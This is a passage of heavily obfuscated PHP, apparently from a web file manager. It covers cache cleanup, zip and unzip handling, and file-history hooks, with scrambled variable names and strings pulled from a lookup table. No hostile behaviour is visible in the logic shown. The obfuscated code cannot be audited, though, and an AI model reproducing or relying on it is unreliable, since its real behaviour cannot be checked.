$this->getFile($Ö‰ëùÕû); if (file_exists($ıº‘•±¹) && filemtime($ıº‘•±¹) < time()) { @unlink($ıº‘•±¹); return !1; } $šÓŠ½ = @file_get_contents($ıº‘•±¹); return substr($šÓŠ½, strlen($this->prefix)); } public function remove($ˆ¿İôã£) { $Åª·ã²ò = $this->getFile($ˆ¿İôã£); return @unlink($Åª·ã²ò); } public function deleteAll() { $äÃÀŞì =& $_SERVER[ ÇƒŠìÀ]; $¬¹ŒÒ€¥ = scandir($this->cachePath); foreach ($¬¹ŒÒ€¥ as $ÛÛüìñÛ) { $„©ğÉ = $this->cachePath . $ÛÛüìñÛ; if (strpos($„©ğÉ, $äÃÀŞì[868]) && strpos($„©ğÉ, $äÃÀŞì[869])) { @unlink($„©ğÉ); } } } public function clearTimeout() { $† £Æ§  =& $_SERVER[ ÇƒŠìÀ]; $ÖØûÁ½ˆ = scandir($this->cachePath); foreach ($ÖØûÁ½ˆ as $´³ÔÁîˆ) { $æõŞ»¦ = $this->cachePath . $´³ÔÁîˆ; if (strpos($æõŞ»¦, $† £Æ§ [868]) && strpos($æõŞ»¦, $† £Æ§ [869]) && filemtime($æõŞ»¦) < time()) { @unlink($æõŞ»¦); } } } } goto b†ïÕ’ˆ·ß; BŒáäœù¾: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $õş×æÈ; if ($õş×æÈ) { return $õş×æÈ; } $ğµª©‰ = IO::init($_SERVER[ ÇƒŠìÀ][8]); return $ğµª©‰; } private static function iconvSystem($¨²ùÍ¬°) { return self::local()->iconvSystem($¨²ùÍ¬°); } private static function iconvApp($œÄšÌÌ«) { return self::local()->iconvApp($œÄšÌÌ«); } public static function zipFolder($ïÍ²×‚§, $¼°»öæ  = "\172\151\160", $â–“ùÌ¹ = '', $åÃ–áÍÇ = REPEAT_RENAME) { $£èÃ«ŠÕ =& $_SERVER[ ÇƒŠìÀ]; $Öæó“ö– = IO::listPath($ïÍ²×‚§); if (!$Öæó“ö–) { return !1; } $Öæó“ö– = array_merge($Öæó“ö–[$£èÃ«ŠÕ[84]], $Öæó“ö–[$£èÃ«ŠÕ[85]]); return self::zip($Öæó“ö–, $¼°»öæ , $â–“ùÌ¹, $åÃ–áÍÇ); } public static function zip($—Æ×¿—í, $ÏñêÁ†Ğ = "\172\151\160", $¿€°ÊÊ = '', $ë’ó°¼® = REPEAT_RENAME) { $±·ù =& $_SERVER[ ÇƒŠìÀ]; if (is_string($—Æ×¿—í) && $—Æ×¿—í) { $—Æ×¿—í = array(array($±·ù[86] => $—Æ×¿—í)); } $ÀÍêÎ×§ = self::init($—Æ×¿—í[0][$±·ù[86]]); $ÎÂØĞÛÁ = self::info($—Æ×¿—í[0][$±·ù[86]]); $ÀÁïó  = $±·ù[12]; $°·ò¦Ì = $±·ù[12]; $Õ³æŒÔï = $±·ù[12]; if ($¿€°ÊÊ && substr($¿€°ÊÊ, -1, 1) != $±·ù[8]) { $°·ò¦Ì = get_path_father($¿€°ÊÊ); $Õ³æŒÔï = get_path_this($¿€°ÊÊ); } else { $°·ò¦Ì = self::pathFather($ÎÂØĞÛÁ[$±·ù[86]]); $Õ³æŒÔï = $ÎÂØĞÛÁ[$±·ù[32]] . $±·ù[10] . $ÏñêÁ†Ğ; if (count($—Æ×¿—í) > 1) { $Çœ¬ê¯ö = IO::info($°·ò¦Ì); $Õ³æŒÔï = $Çœ¬ê¯ö[$±·ù[32]] . $±·ù[10] . $ÏñêÁ†Ğ; } if ($¿€°ÊÊ) { $°·ò¦Ì = $¿€°ÊÊ; } } if ($ÀÍêÎ×§->getType() == $±·ù[108]) { $÷Š¶›§Š = self::init($°·ò¦Ì); $œåš´àÅ = $÷Š¶›§Š->getType() == $±·ù[108] ? $°·ò¦Ì : get_path_father($ÀÍêÎ×§->path); $œåš´àÅ = rtrim($œåš´àÅ, $±·ù[8]) . $±·ù[8]; mk_dir($œåš´àÅ); } else { $ÀÁïó  = TEMP_FILES . $±·ù[1218] . time() . rand_string(8) . $±·ù[8]; mk_dir($ÀÁïó ); file_put_contents($ÀÁïó  . $±·ù[1219], $±·ù[12]); $œåš´àÅ = $ÀÁïó ; } $¬¾Òéß‚ = IO::info($œåš´àÅ); if (!$¬¾Òéß‚ || !$¬¾Òéß‚[$±·ù[219]]) { show_json(LNG($±·ù[1220]), !1); } $Ö›â¹ÅÄ = self::zipFileList($—Æ×¿—í, $ÀÁïó ); foreach ($Ö›â¹ÅÄ as $îåÁõŞ => $Àôº‹ö®) { $Ö›â¹ÅÄ[$îåÁõŞ] = self::iconvSystem($Àôº‹ö®); } $¦ÑÕëˆ = get_filename_auto($œåš´àÅ . $Õ³æŒÔï, $±·ù[12], $ë’ó°¼®); KodArchive::create(self::iconvSystem($¦ÑÕëˆ), $Ö›â¹ÅÄ); if (!IO::exist($¦ÑÕëˆ)) { if ($ÀÁïó ) { del_dir($ÀÁïó ); } show_json(LNG($±·ù[1221]), !1); } if (!$ÀÁïó ) { return $¦ÑÕëˆ; } $ŠÃ£ºµ = self::move($¦ÑÕëˆ, $°·ò¦Ì, $ë’ó°¼®); if ($ÀÁïó ) { del_dir($ÀÁïó ); } if (!$¦ÑÕëˆ) { show_json(LNG($±·ù[1221]), !1); } return $ŠÃ£ºµ; } public static function unzip($Áüº´ÄÂ, $È·ªú¯‰, $¹ô±Ù÷ = "\x2d\x31", $Éá¥æÔ° = "\162\145\x70\x6c\x61\143\145") { $ÉçôØ¸™ =& $_SERVER[ ÇƒŠìÀ]; $ÇîÖÍŞ = parent::info($Áüº´ÄÂ); if (!$ÇîÖÍŞ) { show_json(LNG($ÉçôØ¸™[1222]), !1); } $íÄ—ˆ€ = IO::infoFullSimple($È·ªú¯‰); if (!$íÄ—ˆ€) { $È·ªú¯‰ = IO::mkdir($È·ªú¯‰); } if (isset($íÄ—ˆ€[$ÉçôØ¸™[183]]) && trim($íÄ—ˆ€[$ÉçôØ¸™[86]], $ÉçôØ¸™[8]) != trim($È·ªú¯‰, $ÉçôØ¸™[8])) { $ß‡×Öîš = KodIO::make($íÄ—ˆ€[$ÉçôØ¸™[182]]); $˜–¤—±á = IO::fileNameAuto($ß‡×Öîš, $íÄ—ˆ€[$ÉçôØ¸™[32]], REPEAT_RENAME_FOLDER, !0); $È·ªú¯‰ = IO::mkdir($ß‡×Öîš . $˜–¤—±á); } $¹ô±Ù÷ = $¹ô±Ù÷ && $¹ô±Ù÷ != $ÉçôØ¸™[1223] ? @json_decode($¹ô±Ù÷, !0) : -1; $Ñ¡ÃÇÛ¯ = self::unzipPart($Áüº´ÄÂ, $¹ô±Ù÷); if (!$Ñ¡ÃÇÛ¯ || !IO::exist($Ñ¡ÃÇÛ¯[$ÉçôØ¸™[216]])) { show_json(LNG($ÉçôØ¸™[107]), !1); } $·éæÔ…‚ = $Ñ¡ÃÇÛ¯[$ÉçôØ¸™[1224]][count($Ñ¡ÃÇÛ¯[$ÉçôØ¸™[1224]]) - 1]; if ($·éæÔ…‚[$ÉçôØ¸™[1225]] == -1 || substr($·éæÔ…‚[$ÉçôØ¸™[32]], -1, 1) == $ÉçôØ¸™[8]) { $½‡åå¸ô = $Ñ¡ÃÇÛ¯[$ÉçôØ¸™[1226]] . rand_string(10) . $ÉçôØ¸™[8]; mk_dir($½‡åå¸ô); $¶Ó³ë¯« = count($Ñ¡ÃÇÛ¯[$ÉçôØ¸™[1224]]) == 1 ? IO::ext($Áüº´ÄÂ) : get_path_ext($Ñ¡ÃÇÛ¯[$ÉçôØ¸™[216]]); $Šİ“ÈóÆ = KodArchive::extract(self::iconvSystem($Ñ¡ÃÇÛ¯[$ÉçôØ¸™[216]]), $½‡åå¸ô, $·éæÔ…‚[$ÉçôØ¸™[1225]], $˜–¤—±á, $¶Ó³ë¯«); self::unzipErrorCheck($Šİ“ÈóÆ, array($ÉçôØ¸™[1227], $Áüº´ÄÂ, $¶Ó³ë¯«, $È·ªú¯‰, $Ñ¡ÃÇÛ¯)); Hook::trigger($ÉçôØ¸™[1228], $½‡åå¸ô); recursion_dir($½‡åå¸ô, $°íÉ÷èÎ, $Î½†‹ï“, 0); $ñè˜ƒ = array_merge($°íÉ÷èÎ, $Î½†‹ï“); $Ë¡¿š¶Ä = array(); foreach ($ñè˜ƒ as $àßÍ’¾) { $¾ ‰Ç“ˆ = IO::move(self::iconvApp($àßÍ’¾), $È·ªú¯‰, $Éá¥æÔ°); if ($¾ ‰Ç“ˆ) { $Ë¡¿š¶Ä[] = $¾ ‰Ç“ˆ; } } del_dir($½‡åå¸ô); } else { $¾ ‰Ç“ˆ = IO::move($Ñ¡ÃÇÛ¯[$ÉçôØ¸™[216]], $È·ªú¯‰, $Éá¥æÔ°, get_path_this($·éæÔ…‚[$ÉçôØ¸™[32]])); if ($¾ ‰Ç“ˆ) { $Ë¡¿š¶Ä[] = $¾ ‰Ç“ˆ; } } return $Ë¡¿š¶Ä ? $Ë¡¿š¶Ä : !1; } public static function unzipList($û÷öÑ‚ğ) { $Õñˆ© =& $_SERVER[ ÇƒŠìÀ]; $Å×ŒÏİ = isset($û÷öÑ‚ğ[$Õñˆ©[1229]]) ? $û÷öÑ‚ğ[$Õñˆ©[1229]] : !1; $Åú¿€Õ = isset($û÷öÑ‚ğ[$Õñˆ©[1225]]) ? @json_decode($û÷öÑ‚ğ[$Õñˆ©[1225]], !0) : -1; $úúŞïÉœ = self::unzipPart($û÷öÑ‚ğ[$Õñˆ©[86]], $Åú¿€Õ); if (!$úúŞïÉœ || !IO::exist($úúŞïÉœ[$Õñˆ©[216]])) { show_json(LNG($Õñˆ©[107]), !1); } $Ç«»­‡ê = $úúŞïÉœ[$Õñˆ©[1224]][count($úúŞïÉœ[$Õñˆ©[1224]]) - 1]; $Å×ò÷¼‚ = in_array(IO::ext($úúŞïÉœ[$Õñˆ©[216]]), array($Õñˆ©[359], $Õñˆ©[1230], $Õñˆ©[1231], $Õñˆ©[1232], $Õñˆ©[1233], $Õñˆ©[1234])); if (!$Å×ŒÏİ && ($Ç«»­‡ê[$Õñˆ©[1225]] == -1 || $Å×ò÷¼‚)) { $—Áò‰ƒ­ = $úúŞïÉœ[$Õñˆ©[1226]] . get_path_this($úúŞïÉœ[$Õñˆ©[216]]) . $Õñˆ©[1235]; if (!IO::exist($—Áò‰ƒ­)) { $æ¶›ÃŞ² = $Ç«»­‡ê[$Õñˆ©[1225]] == -1 ? get_path_ext(IO::pathThis($û÷öÑ‚ğ[$Õñˆ©[86]])) : get_path_ext($úúŞïÉœ[$Õñˆ©[216]]); $Ñ¼¹±Ë€ = KodArchive::listContent(self::iconvSystem($úúŞïÉœ[$Õñˆ©[216]]), !0, $æ¶›ÃŞ²); self::unzipErrorCheck($Ñ¼¹±Ë€, array($Õñˆ©[1236], $û÷öÑ‚ğ, $úúŞïÉœ)); @file_put_contents($—Áò‰ƒ­, json_encode($Ñ¼¹±Ë€[$Õñˆ©[1237]])); } return @json_decode(IO::getContent($—Áò‰ƒ­), !0); } IO::fileOut($úúŞïÉœ[$Õñˆ©[216]], $Å×ŒÏİ, get_path_this($Ç«»­‡ê[$Õñˆ©[32]])); die; } private static function zipFileList($£¶£ÓŒŸ, $ßÏ”şÚ‰ = false) { $Ìò’–¬‰ =& $_SERVER[ ÇƒŠìÀ]; $ÆÍáç ™ = array(); foreach ($£¶£ÓŒŸ as $Ï§ÓşÛ¦) { $ìÍïÛ²± = $Ï§ÓşÛ¦[$Ìò’–¬‰[86]]; if ($ßÏ”şÚ‰) { $ìÍïÛ²± = self::copy($Ï§ÓşÛ¦[$Ìò’–¬‰[86]], $ßÏ”şÚ‰, $Ìò’–¬‰[847]); } else { $ÙÜ—ÈŸ = self::init($Ï§ÓşÛ¦[$Ìò’–¬‰[86]]); if ($ÙÜ—ÈŸ->getType() == $Ìò’–¬‰[108]) { $ìÍïÛ²± = $ÙÜ—ÈŸ->path; } } if ($ìÍïÛ²± && self::local()->exist($ìÍïÛ²±)) { $ÆÍáç ™[$Ï§ÓşÛ¦[$Ìò’–¬‰[86]]] = $ìÍïÛ²±; } } if (!empty($ÆÍáç ™)) { return array_values($ÆÍáç ™); } show_json(LNG($Ìò’–¬‰[1200]), !1); } private static function localFilePath($ÓüÆäñğ) { $ĞÁÂ­³’ =& $_SERVER[ ÇƒŠìÀ]; $×”·«Îé = KodIO::parse($ÓüÆäñğ); if ($×”·«Îé[$ĞÁÂ­³’[33]] == KodIO::KOD_SOURCE) { $ˆ«şÅ¯á = Model($ĞÁÂ­³’[854])->fileInfoGet(KodIO::sourceID($ÓüÆäñğ)); if (!$ˆ«şÅ¯á[$ĞÁÂ­³’[86]]) { show_json($ĞÁÂ­³’[1238], !1); } $ÓüÆäñğ = $ˆ«şÅ¯á[$ĞÁÂ­³’[86]]; } $Óóë¹‹ç = self::init($ÓüÆäñğ); if ($Óóë¹‹ç->pathParse[$ĞÁÂ­³’[1186]]) { $ÓüÆäñğ = $Óóë¹‹ç->pathParse[$ĞÁÂ­³’[1186]]; $Óóë¹‹ç = self::init($ÓüÆäñğ); } $†à¢Áê = $Óóë¹‹ç->getType(); if ($†à¢Áê == $ĞÁÂ­³’[108] || $†à¢Áê == $ĞÁÂ­³’[1239]) { if (!$Óóë¹‹ç->exist($Óóë¹‹ç->path)) { show_json(LNG($ĞÁÂ­³’[107]), !1); } return $Óóë¹‹ç->path; } return !1; } public static function unzipPart($–óº¹á¬, $ŠÓ¼¨†ñ = -1) { $Æû¾ı”© =& $_SERVER[ ÇƒŠìÀ]; $İó¸û¦ƒ = IO::pathThis($–óº¹á¬); if (!$ŠÓ¼¨†ñ || $ŠÓ¼¨†ñ == -1) { $¼•‘°äÄ = array(array($Æû¾ı”©[32] => $İó¸û¦ƒ, $Æû¾ı”©[1225] => -1)); $¼•‘°äÄ[0][$Æû¾ı”©[1240]] = $¼•‘°äÄ[0][$Æû¾ı”©[32]]; } else { if (is_array($ŠÓ¼¨†ñ)) { $¼•‘°äÄ = $ŠÓ¼¨†ñ; $ºÒ·½­” = count($¼•‘°äÄ) - 1; for ($Ê¸€Ç©€ = 0; $Ê¸€Ç©€ <= $ºÒ·½­”; $Ê¸€Ç©€++) { $‹ûÅ£„º = $¼•‘°äÄ[$Ê¸€Ç©€]; $„ŠÆ§§ = get_path_this($‹ûÅ£„º[$Æû¾ı”©[32]]) . (checkExtSafe($‹ûÅ£„º[$Æû¾ı”©[32]]) ? $Æû¾ı”©[12] : $Æû¾ı”©[1241]); $¼•‘°äÄ[$Ê¸€Ç©€][$Æû¾ı”©[1240]] = $Æû¾ı”©[1242] . intval($‹ûÅ£„º[$Æû¾ı”©[1225]]) . $Æû¾ı”©[432] . $„ŠÆ§§; if ($Ê¸€Ç©€ == 0) { continue; } $¼•‘°äÄ[$Ê¸€Ç©€][$Æû¾ı”©[1240]] = $¼•‘°äÄ[$Ê¸€Ç©€ - 1][$Æû¾ı”©[1240]] . $Æû¾ı”©[1243] . $¼•‘°äÄ[$Ê¸€Ç©€][$Æû¾ı”©[1240]]; } } } if (!is_array($¼•‘°äÄ) || count($¼•‘°äÄ) == 0) { return !1; } $ØŠÓš‡È = $¼•‘°äÄ[count($¼•‘°äÄ) - 1]; if (!IO::exist($–óº¹á¬)) { return !1; } $›æá¨Óñ = TEMP_FILES . $Æû¾ı”©[1244] . kodIO::hashPathSafe($–óº¹á¬) . $Æû¾ı”©[8]; $æå‹³ÚÖ = $›æá¨Óñ . $ØŠÓš‡È[$Æû¾ı”©[1240]]; mk_dir($›æá¨Óñ); file_put_contents(TEMP_FILES . $Æû¾ı”©[1219], $Æû¾ı”©[12]); if (IO::exist($æå‹³ÚÖ)) { return array($Æû¾ı”©[216] => $æå‹³ÚÖ, $Æû¾ı”©[1224] => $¼•‘°äÄ, $Æû¾ı”©[1226] => $›æá¨Óñ); } $±šßãÒ = self::localFilePath($–óº¹á¬); if (!$±šßãÒ) { $±šßãÒ = $›æá¨Óñ . $Æû¾ı”©[1245]; if (!IO::exist($±šßãÒ)) { self::copy($–óº¹á¬, $›æá¨Óñ, !1, get_path_this($±šßãÒ)); } } if (!$±šßãÒ || !IO::exist($±šßãÒ)) { return !1; } if ($ØŠÓš‡È[$Æû¾ı”©[1225]] == -1) { return array($Æû¾ı”©[216] => $±šßãÒ, $Æû¾ı”©[1224] => $¼•‘°äÄ, $Æû¾ı”©[1226] => $›æá¨Óñ); } $Á‰Œ„Àå = $±šßãÒ; foreach ($¼•‘°äÄ as $Ê¸€Ç©€ => $‹ûÅ£„º) { if (!$‹ûÅ£„º || $‹ûÅ£„º[$Æû¾ı”©[1225]] == $Æû¾ı”©[1223]) { break; } if (substr($‹ûÅ£„º[$Æû¾ı”©[32]], -1, 1) == $Æû¾ı”©[8]) { break; } $Õ‹¢Ú‰ = in_array(get_path_ext($‹ûÅ£„º[$Æû¾ı”©[1240]]), array($Æû¾ı”©[359], $Æû¾ı”©[1230], $Æû¾ı”©[1231], $Æû¾ı”©[1232], $Æû¾ı”©[1233], $Æû¾ı”©[1234])); $Ï‘Ğ¥¢ê = $Ê¸€Ç©€ == count($¼•‘°äÄ) - 1 && $Õ‹¢Ú‰; $ÎşóÀà¤ = $›æá¨Óñ . $‹ûÅ£„º[$Æû¾ı”©[1240]]; $úÆÈêÀŸ = $›æá¨Óñ . get_path_this($‹ûÅ£„º[$Æû¾ı”©[32]]); if (IO::exist($ÎşóÀà¤)) { $Á‰Œ„Àå = $ÎşóÀà¤; continue; } $Ä–ç²Êá = $Ê¸€Ç©€ == 0 ? get_path_ext($İó¸û¦ƒ) : get_path_ext($Á‰Œ„Àå); $¡˜·ÈŸ¹ = KodArchive::extract(self::iconvSystem($Á‰Œ„Àå), $›æá¨Óñ, $‹ûÅ£„º[$Æû¾ı”©[1225]], $õ€Ûı…ë, $Ä–ç²Êá); self::unzipErrorCheck($¡˜·ÈŸ¹, array($Æû¾ı”©[1246], $–óº¹á¬, $¼•‘°äÄ, $‹ûÅ£„º, $ÎşóÀà¤)); if (IO::exist($úÆÈêÀŸ)) { IO::rename($úÆÈêÀŸ, get_path_this($ÎşóÀà¤)); } $Á‰Œ„Àå = $ÎşóÀà¤; } $æå‹³ÚÖ = $Á‰Œ„Àå; return array($Æû¾ı”©[216] => $Á‰Œ„Àå, $Æû¾ı”©[1224] => $¼•‘°äÄ, $Æû¾ı”©[1226] => $›æá¨Óñ); } private static function unzipErrorCheck($öÀ´˜¨Ë, $İ¸é®ÁĞ = false) { $¾¾¿ˆÉ¾ =& $_SERVER[ ÇƒŠìÀ]; if ($öÀ´˜¨Ë[$¾¾¿ˆÉ¾[1247]]) { return !0; } write_log(array($¾¾¿ˆÉ¾[1248], $öÀ´˜¨Ë, $İ¸é®ÁĞ), $¾¾¿ˆÉ¾[1249]); show_json($¾¾¿ˆÉ¾[1250] . json_encode($öÀ´˜¨Ë[$¾¾¿ˆÉ¾[1237]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $ÏÈ»ÕŠ¥ =& $_SERVER[ ÇƒŠìÀ]; $ÓŠ¤µ = $GLOBALS[$ÏÈ»ÕŠ¥[6]][$ÏÈ»ÕŠ¥[91]]; if ($ÓŠ¤µ[$ÏÈ»ÕŠ¥[1251]] != 1) { return; } if ($ÓŠ¤µ[$ÏÈ»ÕŠ¥[1252]] <= 0) { return; } if (isset($_REQUEST[$ÏÈ»ÕŠ¥[1253]]) && $_REQUEST[$ÏÈ»ÕŠ¥[1253]] == $ÏÈ»ÕŠ¥[90]) { return; } Hook::bind($ÏÈ»ÕŠ¥[1254], $ÏÈ»ÕŠ¥[1255]); Hook::bind($ÏÈ»ÕŠ¥[1256], $ÏÈ»ÕŠ¥[1257]); Hook::bind($ÏÈ»ÕŠ¥[1258], $ÏÈ»ÕŠ¥[1259]); Hook::bind($ÏÈ»ÕŠ¥[1260], $ÏÈ»ÕŠ¥[1261]); Hook::bind($ÏÈ»ÕŠ¥[1262], $ÏÈ»ÕŠ¥[1263]); Hook::bind($ÏÈ»ÕŠ¥[1264], $ÏÈ»ÕŠ¥[1265]); } public static function eventBeforeUpload($†÷ŒÇŸ) { if ($†÷ŒÇŸ[3] && $†÷ŒÇŸ[3] != REPEAT_REPLACE) { return; } $Ãí÷‚Íê = self::parsePath($†÷ŒÇŸ[0]); if (!$Ãí÷‚Íê) { return; } self::add($Ãí÷‚Íê); } public static function eventBeforeEdit($›ŒÕ¿™¨) { $–ñ†Ş¬Ÿ = self::parsePath($›ŒÕ¿™¨[0]); if (!$–ñ†Ş¬Ÿ) { return; } self::add($–ñ†Ş¬Ÿ); } public static function eventBeforeCopyFile($ÉúúÖÖ, $ò‘ğÂ¢¼, $ÒÚåÌøé, $èÖ½­ú¤, $ÜÛ“ı‡Á, $Ñ—¡’œÑ) { $»óãë =& $_SERVER[ ÇƒŠìÀ]; if (isset($ÒÚåÌøé->_data[$»óãë[1190]]) && $ÒÚåÌøé->_data[$»óãë[1190]]) { return; } $øÀ«óæË = $ÒÚåÌøé->getPathOuter($èÖ½­ú¤); $á“­çƒÚ = self::parsePath($øÀ«óæË); if (!$á“­çƒÚ) { return; } self::add($á“­çƒÚ); } public static function eventBeforeRename($ï›æ×») { $Ù³×­ü =& $_SERVER[ ÇƒŠìÀ]; $£¿¿¢ë€ = self::parsePath($ï›æ×»[0]); if (!$£¿¿¢ë€) { return; } $ıúÖ…ƒ = self::checkInHistory($£¿¿¢ë€); if (!$ıúÖ…ƒ) { return; } if ($ıúÖ…ƒ[$Ù³×­ü[33]] == $Ù³×­ü[216]) { $¾òõóŠ€ = self::listData($£¿¿¢ë€); if ($¾òõóŠ€ && $¾òõóŠ€[$Ù³×­ü[415]]) { self::moveHistory($£¿¿¢ë€, $ï›æ×»[1]); } } else { IO::rename($ıúÖ…ƒ[$Ù³×­ü[86]], $ï›æ×»[1]); } } public static function eventBeforeMove($×»«–ÆÅ) { $‘óé–›è =& $_SERVER[ ÇƒŠìÀ]; $‚Ì¥Ó = self::parsePath($×»«–ÆÅ[0]); if (!$‚Ì¥Ó) { return; } $„õü¨¸ = self::parsePath($×»«–ÆÅ[1]); if (!$„õü¨¸) { return; } $¾¥ÂÏşş = $×»«–ÆÅ[3]; $†ô¢¶Å = self::checkInHistory($‚Ì¥Ó); if (!$†ô¢¶Å) { return; } $É¶º¯ªÙ = self::pathHistory($„õü¨¸); if ($†ô¢¶Å[$‘óé–›è[33]] == $‘óé–›è[216]) { $¹·¶öˆ = self::listData($‚Ì¥Ó); $ÊŠŞˆµ³ = rtrim($„õü¨¸, $‘óé–›è[8]) . $‘óé–›è[8] . ($¾¥ÂÏşş ? $¾¥ÂÏşş : get_path_this($‚Ì¥Ó)); $¹„Á¶œÔ = self::listData($ÊŠŞˆµ³); if ($¹·¶öˆ && $¹·¶öˆ[$‘óé–›è[415]] && $¹„Á¶œÔ && $¹„Á¶œÔ[$‘óé–›è[415]]) { return self::clear($‚Ì¥Ó); } if ($¹·¶öˆ && $¹·¶öˆ[$‘óé–›è[415]]) { self::moveHistory($‚Ì¥Ó, $¾¥ÂÏşş, $É¶º¯ªÙ); } } else { IO::move($†ô¢¶Å[$‘óé–›è[86]], $É¶º¯ªÙ, !1, $¾¥ÂÏşş); self::clearEmptyFolder(IO::pathFather($†ô¢¶Å[$‘óé–›è[86]])); } } public static function eventAfterRemove($Á’èî™, $Ù‘é›æÑ) { $ÌûÉùóµ =& $_SERVER[ ÇƒŠìÀ]; if (!$Ù‘é›æÑ) { return; } $…ığéÜæ = self::parsePath($Á’èî™[0]); if (!$…ığéÜæ) { return; } $”¥ë™‡— = self::checkInHistory($…ığéÜæ); if (!$”¥ë™‡—) { return; } if ($”¥ë™‡—[$ÌûÉùóµ[33]] == $ÌûÉùóµ[216]) { $±ÙÆ‚Ø— = self::listData($…ığéÜæ, !1); if ($±ÙÆ‚Ø— && $±ÙÆ‚Ø—[$ÌûÉùóµ[415]]) { self::clear($…ığéÜæ, !1); } } else { IO::remove($”¥ë™‡—[$ÌûÉùóµ[86]]); self::clearEmptyFolder(IO::pathFather($”¥ë™‡—[$ÌûÉùóµ[86]])); } } private static function checkInHistory($ëÙ™Àû) { $ºÂ—âÖ = self::pathHistory($ëÙ™Àû); if (!IO::exist($ºÂ—âÖ)) { $ºÂ—âÖ .= $_SERVER[ ÇƒŠìÀ][1266]; } return IO::exist($ºÂ—âÖ) ? IO::info($ºÂ—âÖ) : !1; } private static function parsePath($ÁÃ¯šÚö) { $¥Àğš¹Ş =& $_SERVER[ ÇƒŠìÀ]; if (!$ÁÃ¯šÚö) { return !1; } if ($GLOBALS[$¥Àğš¹Ş[1267]]) { return; } $ûú¡Ø® = KodIO::parse($ÁÃ¯šÚö); $½†“Ïëä = $ûú¡Ø®[$¥Àğš¹Ş[33]]; $’‘“±¼¹ = !$½†“Ïëä || $½†“Ïëä == KodIO::KOD_IO || $½†“Ïëä == KodIO::KOD_SHARE_ITEM; if (!$’‘“±¼¹ || !$ûú¡Ø®[$¥Àğš¹Ş[1268]]) { return !1; } if (substr($ÁÃ¯šÚö, 0, strlen(DATA_PATH . $¥Àğš¹Ş[1269])) == DATA_PATH . $¥Àğš¹Ş[1269]) { return !1; } if ($½†“Ïëä == KodIO::KOD_SHARE_ITEM) { $Ï›ìÇşÈ = IO::init($ÁÃ¯šÚö); if ($Ï›ìÇşÈ->pathParse[$¥Àğš¹Ş[1186]]) { return self::parsePath($Ï›ìÇşÈ->pathParse[$¥Àğš¹Ş[1186]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $Í–æ»• = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $¥Àğš¹Ş[1270]); foreach ($Í–æ»• as $ñ‹×ş·) { if (!$½†“Ïëä && substr($ÁÃ¯šÚö, 0, strlen($ñ‹×ş·)) == $ñ‹×ş·) { return !1; } } self::log($GLOBALS[$¥Àğš¹Ş[1181]] . $¥Àğš¹Ş[1271] . $ÁÃ¯šÚö); return $ÁÃ¯šÚö; } private static function pathHistory($Á‘¾ØîĞ) { $°×êƒ“‚ =& $_SERVER[ ÇƒŠìÀ]; $‰¡Ñ€Å = self::$_historyBase . ltrim(KodIO::clear($Á‘¾ØîĞ), $°×êƒ“‚[8]); $‰¡Ñ€Å = str_replace(array($°×êƒ“‚[1272]), array($°×êƒ“‚[1273]), $‰¡Ñ€Å); return $‰¡Ñ€Å; } public static function log($Ì¶Å£Ÿö) { } public static function historyCount($ÁîŸÉÛó) { $ìŸµ¥«– =& $_SERVER[ ÇƒŠìÀ]; $ÅÕÍ’÷À = array(); $ª¬½ı…¾ = array(); foreach ($ÁîŸÉÛó as $¯ÏÏ­‰¤) { $¾›Çˆ“ = get_path_father($¯ÏÏ­‰¤); if (!$ª¬½ı…¾[$¾›Çˆ“]) { $ª¬½ı…¾[$¾›Çˆ“] = array(); } $ª¬½ı…¾[$¾›Çˆ“][] = get_path_this($¯ÏÏ­‰¤); } foreach ($ª¬½ı…¾ as $¾›Çˆ“ => $¨Àñ€ì¨) { $±Øî„Øä = self::parsePath($¾›Çˆ“); if (!$±Øî„Øä) { continue; } foreach ($¨Àñ€ì¨ as $±òÄÎ°³) { $Ñ‹‡¡Û« = self::listData(rtrim($±Øî„Øä, $ìŸµ¥«–[8]) . $ìŸµ¥«–[8] . $±òÄÎ°³, !1); if ($Ñ‹‡¡Û« && $Ñ‹‡¡Û«[$ìŸµ¥«–[415]]) { $ÅÕÍ’÷À[rtrim($¾›Çˆ“, $ìŸµ¥«–[8]) . $ìŸµ¥«–[8] . $±òÄÎ°³] = count($Ñ‹‡¡Û«[$ìŸµ¥«–[415]]); } } } return $ÅÕÍ’÷À; } public static function add($—Ü–ŒÖö) { $Åµ÷ÚÚ« =& $_SERVER[ ÇƒŠìÀ]; $ÛĞú±©ñ = self::listData($—Ü–ŒÖö); if (!$ÛĞú±©ñ) { return; } $²–¸Ûò = Model($Åµ÷ÚÚ«[799])->get($Åµ÷ÚÚ«[1274]); $÷Şç™½Ø = intval($GLOBALS[$Åµ÷ÚÚ«[6]][$Åµ÷ÚÚ«[91]][$Åµ÷ÚÚ«[1252]]); $–‹Ö™¢â = $²–¸Ûò == $Åµ÷ÚÚ«[1275] ? min(5, $÷Şç™½Ø) : $÷Şç™½Ø; if ($÷Şç™½Ø <= 0) { return; } $ÀêÇº€å = IO::info($—Ü–ŒÖö); $Ÿß¨ºé¸ = $ÛĞú±©ñ[$Åµ÷ÚÚ«[415]]; if ($ÀêÇº€å[$Åµ÷ÚÚ«[78]] == 0) { return; } if ($ÀêÇº€å[$Åµ÷ÚÚ«[78]] >= 1024 * 1024 * 500) { return !1; } $òç€°á” = IO::hashSimple($—Ü–ŒÖö); if ($Ÿß¨ºé¸ && $Ÿß¨ºé¸[0][$Åµ÷ÚÚ«[642]] == $òç€°á”) { return !0; } if (array_key_exists($Åµ÷ÚÚ«[219], $ÀêÇº€å) && !$ÀêÇº€å[$Åµ÷ÚÚ«[219]]) { return !1; } $Ãüú¯çá = short_id(time()); $Òªùèû‹ = array($Åµ÷ÚÚ«[445] => $Ãüú¯çá, $Åµ÷ÚÚ«[642] => $òç€°á”, $Åµ÷ÚÚ«[32] => $ÀêÇº€å[$Åµ÷ÚÚ«[32]] . $Åµ÷ÚÚ«[10] . date($Åµ÷ÚÚ«[1276]) . rand_string(1), $Åµ÷ÚÚ«[78] => $ÀêÇº€å[$Åµ÷ÚÚ«[78]], $Åµ÷ÚÚ«[497] => USER_ID, $Åµ÷ÚÚ«[217] => time(), $Åµ÷ÚÚ«[1277] => $Åµ÷ÚÚ«[12]); IO::mkdir($ÛĞú±©ñ[$Åµ÷ÚÚ«[1278]]); $›ï·øü = IO::copy($—Ü–ŒÖö, 